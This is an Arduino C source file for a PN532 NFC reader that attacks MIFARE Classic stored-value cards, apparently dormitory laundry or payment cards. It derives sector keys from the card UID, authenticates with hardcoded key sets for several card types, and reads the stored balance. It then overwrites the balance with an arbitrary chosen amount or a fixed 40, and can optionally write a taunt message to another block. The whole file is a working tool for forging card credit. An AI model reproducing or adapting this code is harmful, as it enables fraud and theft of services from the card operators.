# include "margoulinade.h"

void            displayKeyDebug(byte *key)
{
    uint8_t     i = -1;

    while (++i < 6)
    {
        Serial.print(key[i], HEX);
        Serial.print(" ");
    }
}

void        writeModeInitialization(t_nfc_handler *nfc_handler, byte dormitory)
{
    if (dormitory == 4)
    {
        lcd.print(F("Balance will be"));
        lcd.setCursor(0,1);
        lcd.print(F("changed to 40..."));
        lcd.setCursor(0,0);
        delay(1500);
    }
    else
    {
        nfc_handler->newBalance = encoderWrite() * 100;
        nfc_handler->balance[0] = nfc_handler->newBalance / 256;
        nfc_handler->balance[1] = nfc_handler->newBalance - (nfc_handler->balance[0] * 256);
    }
}

void        calcOldD4cardKeyA(t_nfc_handler *nfc_handler)
{
    nfc_handler->KeyA_D4[0] = nfc_handler->uid[0];
    nfc_handler->KeyA_D4[1] = nfc_handler->uid[1];
    nfc_handler->KeyA_D4[2] = nfc_handler->uid[2];
    nfc_handler->KeyA_D4[3] = nfc_handler->uid[3];
    nfc_handler->KeyA_D4[4] = nfc_handler->uid[0] ^ nfc_handler->uid[1] ^ nfc_handler->uid[2] ^ nfc_handler->uid[3];
    nfc_handler->KeyA_D4[5] = nfc_handler->uid[0] + nfc_handler->uid[1] + nfc_handler->uid[2] + nfc_handler->uid[3];
}

bool        guessNewD4Keys(t_nfc_handler *nfc_handler, byte *dormitory)
{
    lcd.clear();
    if (!(nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength, 0, nfc_handler->keyNumber, nfc_handler->KeyA_new_D4_part1)))
    {
        nfc_handler->success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, nfc_handler->uid, &nfc_handler->uidLength);
        //Test if it is a new D4 card type 1, same as D3 cards
        if (nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength, 15, nfc_handler->keyNumber, nfc_handler->KeyA_D3_part1))
        {
            lcd.print(F("D4 CARD"));
            lcd.setCursor(0, 1);
            lcd.print(F("Type 1"));
            lcd.setCursor(0,0);
            *dormitory = 3;
        }
        else {
            lcd.print(F("UNKNOWN CARD!"));
            delay(1000);
            return false;
        }
    }
    else
    {
        lcd.print(F("D4 CARD"));
        lcd.setCursor(0, 1);
        lcd.print(F("Type 2"));
        lcd.setCursor(0,0);
        delay(1000);
    }
    return true;
}

void        dormitory3Authentication(t_nfc_handler *nfc_handler)
{
    if (nfc_handler->currentblock >= 5 * 4 && nfc_handler->currentblock <= 6 * 4)
    {
        displayKeyDebug(nfc_handler->KeyA_D3_part2);
        nfc_handler->success = nfc.mifareclassic_AuthenticateBlock (nfc_handler->uid, nfc_handler->uidLength, nfc_handler->currentblock, nfc_handler->keyNumber, nfc_handler->KeyA_D3_part2);
    }
    else
    {
        displayKeyDebug(nfc_handler->KeyA_D3_part1);
        nfc_handler->success = nfc.mifareclassic_AuthenticateBlock (nfc_handler->uid, nfc_handler->uidLength, nfc_handler->currentblock, nfc_handler->keyNumber, nfc_handler->KeyA_D3_part1);
    }
}

void        dormitory4newCardsAuthentication(t_nfc_handler *nfc_handler)
{
    if (nfc_handler->currentblock >= 10 * 4 && nfc_handler->currentblock < 11 * 4)
    {
        displayKeyDebug(nfc_handler->KeyA_new_D4_part2);
        nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength,
                                                                   nfc_handler->currentblock,
                                                                   nfc_handler->keyNumber,
                                                                   nfc_handler->KeyA_new_D4_part2);
    }
    else
    {
        displayKeyDebug(nfc_handler->KeyA_new_D4_part1);
        nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength,
                                                                   nfc_handler->currentblock,
                                                                   nfc_handler->keyNumber,
                                                                   nfc_handler->KeyA_new_D4_part1);
    }
}

void        balanceReadOnly(t_nfc_handler *nfc_handler, byte dormitory)
{
    nfc_handler->offset = dormitory == 4 ? 0 : 7;
    if (nfc_handler->currentblock == 24)
        nfc_handler->currentBalance = dormitory == 4 ?
                                      (nfc_handler->data[nfc_handler->offset + 1] * 256) +
                                      nfc_handler->data[nfc_handler->offset] :
                                      (nfc_handler->data[nfc_handler->offset - 1] * 256) +
                                      nfc_handler->data[nfc_handler->offset];
}

void        newBalanceWrite(t_nfc_handler *nfc_handler)
{
    if (nfc_handler->success)
    {
        Serial.print(F("new B "));Serial.print(nfc_handler->currentblock, DEC);
        Serial.print(" ");
        nfc.PrintHexChar(nfc_handler->data, 16);
    }
}

void        oldDormitory4WriteBalance(t_nfc_handler *nfc_handler)
{
    nfc.mifareclassic_ReadDataBlock(nfc_handler->currentblock, nfc_handler->data);
    nfc_handler->data[0] = (uint8_t)0xA0;
    nfc_handler->data[1] = (uint8_t)0x0F;
    nfc_handler->data[7] = (uint8_t)0x00;
    nfc_handler->data[10] = (uint8_t)0xCA;
    nfc_handler->data[11] = (uint8_t)0x25;
    nfc_handler->data[14] = (uint8_t)0x41;
    nfc_handler->data[15] = (uint8_t)0x9F;
    nfc_handler->success = nfc.mifareclassic_WriteDataBlock(nfc_handler->currentblock, nfc_handler->data);
    newBalanceWrite(nfc_handler);
}

void        balanceShow(t_nfc_handler *nfc_handler, bool mode, byte dormitory)
{
    if (!mode && nfc_handler->success)
    {
        lcd.print(F("Balance :"));
        lcd.print(nfc_handler->currentBalance / 100);
        Serial.println(nfc_handler->currentBalance, DEC);
    }
    else if (mode && nfc_handler->success)
    {
        lcd.print(F("New balance :"));
        dormitory == 3 || 5 ? lcd.print(nfc_handler->newBalance / 100) : lcd.print("40");
        dormitory == 3 || 5 ? Serial.println(nfc_handler->newBalance, DEC) : Serial.println(40, DEC);
    }
    else
    {
        lcd.print(F("Something went"));
        lcd.setCursor(0,1);
        lcd.print(F("wrong"));
    }
    Wire.endTransmission();
}

void        sectorsParsing(t_nfc_handler *nfc_handler, bool mode, byte dormitory)
{
    short   first_block = 0;
    short   last_block = 64;

    if (OPTIMIZATION_MODE)
    {
        first_block = 24;
        if (!mode)
            last_block = 26;
        else
            last_block = 27;
    }
    for (nfc_handler->currentblock = first_block; nfc_handler->currentblock < last_block; nfc_handler->currentblock++)
    {
        // Check if this is a new block so that we can reauthenticate
        if (nfc.mifareclassic_IsFirstBlock(nfc_handler->currentblock))
            nfc_handler->authenticated = false;

        // If the sector hasn't been authenticated, do so first
        if (!nfc_handler->authenticated)
        {
            // Starting of a new sector ... try to to authenticate
            Serial.print(F("------------------------Sector "));Serial.print(nfc_handler->currentblock/4, DEC);Serial.println(F("-------------------------"));
            Serial.print(F("keys used:"));

            if (dormitory == 3)
                dormitory3Authentication(nfc_handler);
            else if (dormitory == 4)
                nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength, nfc_handler->currentblock, nfc_handler->keyNumber, nfc_handler->KeyA_D4);
            else if (dormitory == 5)
                dormitory4newCardsAuthentication(nfc_handler);
            else if (dormitory == 13)
                nfc_handler->success = nfc.mifareclassic_AuthenticateBlock(nfc_handler->uid, nfc_handler->uidLength, nfc_handler->currentblock, nfc_handler->keyNumber, nfc_handler->KeyA_Blank);

            Serial.println("");
            if (nfc_handler->success)
                nfc_handler->authenticated = true;
            else
            {
                Serial.println(F("Authentication error"));
                lcd.clear();
                lcd.print(F("key error"));
            }
        }
        // If we're still not authenticated just skip the block
        if (!nfc_handler->authenticated)
        {
            Serial.print(F("Block "));Serial.print(nfc_handler->currentblock, DEC);Serial.println(F(" unable to authenticate"));
        }
        else
        {
            nfc_handler->success = nfc.mifareclassic_ReadDataBlock(nfc_handler->currentblock, nfc_handler->data);
            if (nfc_handler->success)
            {
                Serial.print(F("Block "));Serial.print(nfc_handler->currentblock, DEC);
                Serial.print(" ");
                // Dump the raw data
                nfc.PrintHexChar(nfc_handler->data, 16);
                if (!mode)
                    balanceReadOnly(nfc_handler, dormitory);
                else
                {
                    if (nfc_handler->currentblock >= 24 && nfc_handler->currentblock <= 26 && dormitory != 4)
                    {
                        if (dormitory == 3 || dormitory == 13)
                            nfc_handler->offset = nfc_handler->currentblock == 25 ? 6 : 7;
                        else
                            nfc_handler->offset = nfc_handler->currentblock == 25 ? 8 : 7;
                        nfc_handler->data[nfc_handler->offset - 1] = nfc_handler->balance[0];
                        nfc_handler->data[nfc_handler->offset] = nfc_handler->balance[1];
                        nfc_handler->success = nfc.mifareclassic_WriteDataBlock(nfc_handler->currentblock, nfc_handler->data);
                        newBalanceWrite(nfc_handler);
                    }
                    else if (nfc_handler->currentblock == 24 || nfc_handler->currentblock == 26 && dormitory == 4)
                        oldDormitory4WriteBalance(nfc_handler);
                    else if (nfc_handler->currentblock == 60 && POURRISSAGE)
                    {
                        memcpy(nfc_handler->data, "You got rekt son", 16);
                        nfc_handler->success = nfc.mifareclassic_WriteDataBlock(nfc_handler->currentblock, nfc_handler->data);
                    }
                }
            }
            else
            {
                // Oops ... something happened
                Serial.print(F("Block "));Serial.print(nfc_handler->currentblock, DEC);
                Serial.println(F(" unable to read this block"));
            }
        }
    }
}
